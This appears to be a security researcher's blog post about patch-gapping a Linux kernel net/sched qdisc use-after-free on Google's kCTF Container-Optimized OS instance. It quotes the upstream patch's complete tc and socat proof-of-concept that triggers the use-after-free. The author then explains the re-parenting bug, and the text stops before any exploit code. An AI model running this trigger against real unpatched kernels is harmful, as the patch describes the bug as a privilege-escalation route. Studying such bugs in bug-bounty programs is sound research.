---
layout: post
title: "Patch-Gapping the Google Container-Optimized OS for $0"
date: 2025-02-13
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - kCTF
  - CTF
  - Kernel
  - Exploit
---

## Background
I'm trying to really focus this year on developing technically in a few ways. Part of that is reviewing kCTF entries. This helps me get a sense of what subsystems are producing the most bugs at the moment in the program and also keeps me up to date on buggy patterns to look for. Also I get to shamelessly steal players' exploitation techniques as well. A lot of recent bugs have come from `/net/sched` so I was looking at patches for the subsystem and found a patch that claimed an exploitable UAF was possible. That patch is [here] (https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=bc50835e83f60f56e9bec2b392fb5544f250fb6f). I didn't realize at the time, but "Lion Ackermann" mentioned in the patch as the bug discoverer (and presumably exploiter) is a kCTF player.

I checked and discovered that at the time I found the patch the COS 105 instance in kCTF was still vulnerable to this bug. I stopped looking then, but lesson learned, the LTS instance was also still vulnerable. I don't know exactly how the rules work, but this bug was exploited as a 0day entry as per the public kCTF responses spreadsheet in December, but at the time I started working on it, there were no patch links in the spreadsheet for this bug and the instances remained unpatched.

At this point I started trying to figure out the bug and possibly exploit it. My goal was to patch-gap the COS 105 instance with a 1day entry. Shortly after I began investigating the bug, a new release was announced, but luckily the new instances would be vulnerable as well as they had also not been patched. Since the COS 105 slot was unexploited, and the upcoming COS 105 instance would also be vulnerable, I mistakenly took this as a signal to not rush as the instance would probably remain unexploited while I worked on the project slowly. In hindsight, I should've worked harder on this as the COS 105 instance was exploited a few hours before I finished. It may be moot anyways since the bug was exploited previously in the program as a 0day, still not sure about that. Anyways, I encountered some self-inflicted roadblocks that really hindered my progress, we'll get into those. Next time I'll work harder and dedicate more time to the effort instead of just a few hours here and there at night. 

## Patch Analysis
The patch text is very descriptive and provides a nice proof-of-concept to reproduce the buggy condition:
```terminal
net: sched: Disallow replacing of child qdisc from one parent to another
Lion Ackermann was able to create a UAF which can be abused for privilege
escalation with the following script

Step 1. create root qdisc
tc qdisc add dev lo root handle 1:0 drr

step2. a class for packet aggregation do demonstrate uaf
tc class add dev lo classid 1:1 drr

step3. a class for nesting
tc class add dev lo classid 1:2 drr

step4. a class to graft qdisc to
tc class add dev lo classid 1:3 drr

step5.
tc qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024

step6.
tc qdisc add dev lo parent 1:2 handle 3:0 drr

step7.
tc class add dev lo classid 3:1 drr

step 8.
tc qdisc add dev lo parent 3:1 handle 4:0 pfifo

step 9. Display the class/qdisc layout

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 limit 1000p
 qdisc drr 3: dev lo parent 1:2

step10. trigger the bug <=== prevented by this patch
tc qdisc replace dev lo parent 1:3 handle 4:0

step 11. Redisplay again the qdiscs/classes

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 1:3 root leaf 4: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 refcnt 2 limit 1000p
 qdisc drr 3: dev lo parent 1:2

Observe that a) parent for 4:0 does not change despite the replace request.
There can only be one parent.  b) refcount has gone up by two for 4:0 and
c) both class 1:3 and 3:1 are pointing to it.

Step 12.  send one packet to plug
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))
step13.  send one packet to the grafted fifo
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10003))

step14. lets trigger the uaf
tc class delete dev lo classid 1:3
tc class delete dev lo classid 1:1

The semantics of "replace" is for a del/add _on the same node_ and not
a delete from one node(3:1) and add to another node (1:3) as in step10.
While we could "fix" with a more complex approach there could be
consequences to expectations so the patch takes the preventive approach of
"disallow such config".
```

The bug here is that a qdisc can be "re-parented" to a class that is not its original parent. This kind of logic was not intended. When you create these types of classes that can have qdiscs attached, a default qdisc is allocated and you can graft a new qdisc to the class afterwards to replace the current qdisc. So you can see that `class 1:3` is first created and then we graft a qdisc onto it in step 8. This will free the default qdisc and instantiate this one in its place and attach it to the class. 

The bug however, lets you graft that qdisc (handle 4:0) onto a different class by using the same grafting mechanism that we used on 3:1 but now we're grafting the same qdisc onto two classes. The patch points out the side effects of this bug are basically this:
1. From qdisc 4:0's point of view, it's parent is still class 3:1, that is never changed
2. From class 3:1's perspective, qdisc 4:0 is still its child qdisc
3. From class 1:3's perspective, qdisc 4:0 is now its child qdisc
4. The refcount on the qdisc is now 2: 1 from the initial graft onto 3:1 and another 1 from the re-parent graft onto 1:3

So those are the side effects the bug produces. At this point, I didn't know a single thing about `/net/sched`, classes, qdiscs, etc, so the learning curve during this process was steep. I had never dealt with this subsystem before in my life. But after a lot of Googling and ChatGPTing, I was able to reproduce the PoC in the patch with the `tc` utility just as the patch specifies. I went through all the steps and when I got to step 14 and it was time to trigger the UAF, I got the following splat after deleting class 1:3\:
